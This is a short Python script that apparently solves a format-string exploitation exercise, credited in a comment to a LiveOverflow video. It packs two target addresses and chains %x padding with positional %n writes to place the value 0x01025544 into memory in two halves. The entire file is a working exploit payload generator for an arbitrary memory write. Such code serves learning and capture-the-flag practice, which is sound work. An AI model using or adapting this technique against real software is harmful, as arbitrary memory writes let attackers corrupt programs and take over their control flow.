#!/usr/bin/env python
import struct

"""
    first put 0x01025544 first two byte
    second put last two byte
    if padding is over, and then overflow them
    this idea is comed from liveoverflow's video
"""

target = struct.pack("<I", 0x080496f4)
target2 = struct.pack("<I", 0x080496f4+2)
format = ""
format += target
format += target2
format += "%12$21820x"
format += "%12$n"
format += "%13$43966x"
format += "%13$n"
print format
